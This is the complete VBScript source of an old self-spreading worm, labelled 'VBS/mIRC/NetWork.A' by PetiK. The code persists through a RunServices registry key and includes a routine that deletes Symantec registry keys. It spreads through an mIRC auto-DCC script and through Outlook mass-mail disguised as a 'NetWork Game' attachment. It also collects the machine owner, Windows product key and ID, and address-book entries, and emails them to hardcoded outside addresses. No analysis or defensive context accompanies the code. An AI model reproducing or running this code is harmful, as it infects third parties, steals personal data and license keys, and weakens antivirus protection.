'VBS/mIRC/NetWork.A par PetiK                           29/12/2000

Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
set file = fso.OpenTextFile(WScript.ScriptFullName,1)
vbscopie = file.ReadAll

DEBUT()
Sub DEBUT()
Set win  = fso.GetSpecialFolder(0)
RS = ("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\NetWork")
Set c = fso.GetFile(WScript.ScriptFullName)
NetWork = (win&"\Network.vbs")
c.Copy (NetWork)
ws.RegWrite RS,NetWork
'NORTON()
MIRC()
ESPION()
EMAIL()
End Sub

Sub NORTON()
ws.RegDelete ("HKLM\Software\Symantec\")
ws.RegDelete ("HKCU\Software\Symantec\")
End Sub

Sub ESPION()
Set win  = fso.GetSpecialFolder(0)
Set A = CreateObject("Outlook.Application")
Set B = A.GetNameSpace("MAPI")
For Each C In B.AddressLists
If C.AddressEntries.Count <> 0 Then
For D = 1 To C.AddressEntries.Count
Set E = C.Addressentries(D)
Next
End If
Next
ComputerName = CreateObject("WScript.NetWork").ComputerName
NOM = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
ENT = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
VER = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Version")
NUM = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
REC1 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductName")
REC2 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey")
REC3 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId")
PPDB = ws.RegRead("HKCU\Control Panel\Desktop\Wallpaper")
DDEV = ws.RegRead("HKCU\Control Panel\Desktop\ScreenSaveTimeOut")
PDEM = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
DDIR = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
Set aze = fso.CreateTextFile ("C:\ESPION.txt",true)
aze.WriteLine "Information sur l'ordinateur"
aze.WriteLine "NOM DE L'ORDINATEUR : " & ComputerName
aze.WriteLine "NOM D'UTILISATEUR : " & NOM
aze.WriteLine "NOM DE L'ENTREPRISE : " & ENT
aze.WriteLine "SYSTEME D'EXPLOITAION : " & VER & " " & NUM
aze.WriteLine "NUMERO DE LICENSE : " & REC1 & " " & REC2
aze.WriteLine "NUMERO D'IDENTIFICATION : " & REC3
aze.WriteLine "PAPIER PEINT DE BUREAU : " & PPDB
aze.WriteLine "L'ECRAN DE VEILLE DE DECLENCHE AU BOUT DE " & DDEV & " SECONDES"
aze.WriteLine "NON DANS CARNET D'ADRESSES : " & E.Name
aze.WriteLine "ADDRESSE : " & E.Address
aze.WriteBlankLines(2)
aze.WriteLine "Information sur internet"
aze.WriteLine "LA PAGE DE DEMARRAGE EST : " & PDEM
aze.WriteLine "LE DOSSIER DE TELECHARGEMENT EST : " & DDIR
End Sub

Sub MIRC()
On Error Resume Next
NET2 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\NetWork")
script = ("C:\script.ini")
 Set srpt = fso.CreateTextFile(script, true)
 srpt.WriteLine  "[script]; par PetiK "
 srpt.WriteLine  "n0=on 1:JOIN:#:{"
 srpt.WriteLine  "n1= /if ( $nick == $me ) { halt }"
 srpt.WriteLine  "n2= /dcc send $nick " & NET2
 srpt.WriteLine  "n3=}"
 srpt.Close
fso.CopyFile script, "C:\mirc\script.ini"
fso.CopyFile script, "C:\mirc32\script.ini"
fso.CopyFile script, "C:\program files\mirc\script.ini"
fso.CopyFile script, "C:\program files\mirc32\script.ini"
fso.DeleteFile ("C:\script.ini")
End Sub

Sub EMAIL()
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count 
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = OApp.CreateItem(0)
msg.To = AddListEntry.Address
msg.Subject = "NetWork Game for WINDOWS"
msg.Body = "The new game for your computer  arrives"
msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0),"\Network.vbs")
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End if
Set msg2 = OApp.CreateItem(0)
msg2.BCC = "Panda34@caramail.com; Pentasm99@aol.com"
msg2.Subject = "Message écrit le " & date
msg2.Body = "Il était " & time
msg2.Attachments.Add ("C:\ESPION.txt")
msg2.Send
fso.DeleteFile ("C:\ESPION.txt")
End Sub
